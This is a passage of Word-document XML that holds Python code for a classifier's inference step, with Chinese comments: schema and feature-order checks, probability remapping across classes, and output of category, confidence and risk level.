        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                "推理侧只支持 class_index 契约，请用当前版 models/train.py 重新训练"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E3F005E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3698AB3B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.label_map = artifact.get("label_map", {})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54C7083C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.trained_at = artifact.get("trained_at")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D243411">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.selected_by = artifact.get("selected_by")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36EBBDD1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.artifact_metrics = artifact.get("metrics", {})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57CF5146">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="78AFFB4C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if schema_path and Path(schema_path).exists():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="498BF4C0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            schema = json.loads(Path(schema_path).read_text(encoding="utf-8"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AC65E77">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            if schema.get("feature_names") != self.feature_names:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57AE7836">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                raise SystemExit(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47DB17EF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    "feature_schema.json 与模型产物里的列序不一致 —— "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="147E9489">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    "重新训练或重新生成 schema，别让线上用错位的特征"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="492BD0B7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21F9BBDD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D0F943A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # ------------------------------------------------------------------ 校验</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D47520A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="61FF7AC5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def check_features(self, names) -&gt; None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4960657A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        """探针报上来的列序必须和训练时一模一样。这里不是"宽容一点"的地方。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AB40054">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        names = list(names)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="460810C7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if names == self.feature_names:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="349005B6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            return</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DBEEA6C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        missing = [n for n in self.feature_names if n not in names]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42678B04">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        extra = [n for n in names if n not in self.feature_names]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57F8FE31">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        raise ValueError(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0502DA53">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            f"特征列不符：缺 {missing[:5]}（共{len(missing)}）多 {extra[:5]}（共{len(extra)}）"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BF4C46D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="451E90D3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="578BBF43">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # ------------------------------------------------------------------ 推理</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39CF5E82">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3EF3904B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def predict_batch(self, values) -&gt; list[dict]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53D33A65">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        X = np.asarray(values, dtype=np.float64)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F9FF106">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if X.ndim != 2:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0873024D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            X = X.reshape(1, -1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C393F92">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if X.shape[1] != len(self.feature_names):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F4777BF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            raise ValueError(f"期望 {len(self.feature_names)} 列，收到 {X.shape[1]} 列")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26486981">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5EFF7D6D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        Xs = self.scaler.transform(X)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FD5274F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        idx = np.asarray(self.model.predict(Xs)).astype(int)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A8B8E09">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="71F05A6D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        proba = self.model.predict_proba(Xs)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="094BDFB4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        # predict_proba 的列对外层类别下标：按 model.classes_ 映射回全量宽度，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4534DECE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        # 不能假设列序就是 0..K-1（某个基学习器漏掉稀有类时列会少）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71F8D0E9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        model_classes = np.asarray(getattr(self.model, "classes_", np.arange(len(self.classes))))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E10AF17">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        proba_full = np.zeros((len(X), len(self.classes)), dtype=np.float64)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="076FD3C8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        for j, c in enumerate(model_classes):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D02C193">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            proba_full[:, int(c)] = proba[:, j]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="286CDB02">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D3785B7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        out = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A32B835">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        for i in range(len(X)):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29D49EDB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            name = self.classes[int(idx[i])]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42A9A90F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            conf = float(proba_full[i, int(idx[i])])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E718F19">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            out.append(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49D838D9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65243D69">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    "category": name,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="236E056A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    "confidence": round(conf, 6),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="513733A4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    "risk": escalate(BASE_RISK.get(name, "medium"), conf),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AB30ACD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    "proba": {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="440F50A3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                        cls: round(float(proba_full[i, k]), 6)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55F7F27B">
